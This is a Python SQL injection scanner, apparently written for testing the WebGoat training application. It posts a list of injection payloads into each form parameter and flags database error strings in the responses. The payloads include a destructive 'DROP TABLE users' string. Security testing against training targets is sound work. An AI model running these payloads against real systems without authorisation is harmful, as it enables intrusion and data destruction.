import requests
from urllib.parse import urljoin

# Enhanced payloads for testing SQL injection vulnerabilities in WebGoat
WEBGOAT_SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1' --",
    "' UNION SELECT 1, 'a', 'b', 'c', 'd', 'e' --",
    "'; DROP TABLE users; --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1 /*",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 'a'='a' /*",
    "' OR 'a'='a' #",
    "' OR 1=1; --",
    "' OR 1=1; #",
    "' OR 1=1; /*",
    "' OR 'a'='a'; --",
    "' OR 'a'='a'; #",
    "' OR 'a'='a'; /*",
    "' OR 'a'='a' AND 'b'='b",
    "' OR 'a'='a' AND 'b'='b' --",
    "' OR 'a'='a' AND 'b'='b' /*",
    "' OR 'a'='a' AND 'b'='b' #"
]

def scan_sql_injection(url, params):
    """
    This function attempts SQL injection attacks on a given endpoint with
    specified parameters using various SQL injection payloads.

    :param url: The full endpoint URL to test
    :param params: The parameters to inject payloads into
    :return: A list of detected vulnerabilities or an empty list if none are found
    """
    vulnerabilities = []

    for param_name, param_value in params.items():
        for payload in WEBGOAT_SQL_INJECTION_PAYLOADS:
            injected_params = params.copy()
            injected_params[param_name] = payload

            try:
                response = requests.post(url, data=injected_params)

                # Check for vulnerability based on response
                if is_vulnerable(response):
                    vulnerabilities.append({
                        "issue": f"SQL Injection in parameter '{param_name}'",
                        "description": f"SQL injection vulnerability detected with payload: {payload}",
                        "severity": "High",
                        "details": response.text[:500]  # Limit details to first 500 characters
                    })

            except requests.RequestException as e:
                vulnerabilities.append({
                    "issue": f"SQL Injection in parameter '{param_name}'",
                    "description": f"Request failed with payload: {payload}",
                    "severity": "Medium",
                    "details": f"Request error: {str(e)}"
                })

    return vulnerabilities

def is_vulnerable(response):
    """
    Check the response for indicators of a successful SQL injection attack.

    :param response: The response object from the HTTP request
    :return: True if the response indicates a SQL injection vulnerability
    """
    error_messages = [
        "SQL syntax", "mysql_fetch", "MySQL", "PostgreSQL", "ODBC", "sqlite", "ORA-"
    ]

    for error in error_messages:
        if error in response.text:
            return True
    return False
